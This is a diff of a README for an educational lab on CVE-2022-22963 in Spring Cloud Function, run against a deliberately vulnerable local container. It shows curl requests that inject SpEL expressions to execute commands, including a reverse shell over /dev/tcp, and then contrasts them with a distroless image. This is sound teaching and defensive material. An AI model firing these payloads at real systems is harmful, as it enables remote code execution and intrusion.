@@ -23,7 +23,7 @@ Spring Cloud Function allows routing HTTP requests via the `spring.cloud.functio
 docker build -t vuln-spring .
 
 # Run the container (we add the host.docker.internal so it can communicate back to the host for a reverse shell)
-docker run -p 8080:8080 --add-host=host.docker.internal:host-gateway --name vuln-app vuln-spring
+docker run -p 8080:8080 --add-host=host.docker.internal:host-gateway vuln-spring
 
 # Verify it's running
 curl http://localhost:8080/
@@ -35,7 +35,7 @@ Expected output: `Vulnerable Spring Cloud Function Demo - CVE-2022-22963`
 
 ## Exploitation
 
-### 1. Test Vulnerability - Execute `whoami`
+### 1. Check who the container is running as
 
 ```bash
 curl -X POST http://127.0.0.1:8080/functionRouter \
@@ -43,7 +43,12 @@ curl -X POST http://127.0.0.1:8080/functionRouter \
   --data 'Never gonna give you up'
 ```
 
-**Note:** Check the http://localhost:8080/result page and you should see a whoami.txt file you can open to see the results
+**Note:** You will see an Internal server error like below from your curl to the functionRouter endpoint. You can ignore this.
+```
+{"timestamp":"2026-01-23T03:22:52.333+00:00","status":500,"error":"Internal Server Error","path":"/functionRouter"}
+```
+
+**Note 2:** Check the http://localhost:8080/result page and you should see a whoami.txt file you can open to see the results
 
 ### 2. Show Processes
 
@@ -70,6 +75,33 @@ curl -X POST http://127.0.0.1:8080/functionRouter \
   -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"bash","-c","bash -i >& /dev/tcp/host.docker.internal/4444 0>&1"})' \
   --data 'Never gonna run around and desert you'
 ```
+
+## Enter Distroless....
+
+As we just saw, it's trivial to run shell commands via the Spring4Shell CVE above... but what if there is no shell? Enter distroless containers
+
+Let's rebuild the container and run the same tests against a Distroless version
+
+See Dockerfile.chainguard, we just swapped out the runtime image from `eclipse-temurin:latest` to `cgr.dev/chainguard/jre:latest`
+
+### Build and Run the Vulnerable App in a distroless container
+
+```bash
+# Build the Docker image
+docker build -t vuln-spring:distroless . -f Dockerfile.chainguard
+
+# Run the container (we add the host.docker.internal so it can communicate back to the host for a reverse shell)
+docker run -p 8080:8080 --add-host=host.docker.internal:host-gateway vuln-spring:distroless
+
+# Verify it's running
+curl http://localhost:8080/
+```
+
+Expected output: `Vulnerable Spring Cloud Function Demo - CVE-2022-22963`
+
+Now run the same above Exploitation steps above, what are the results?
+
+---
 
 ## Educational Use Only
 
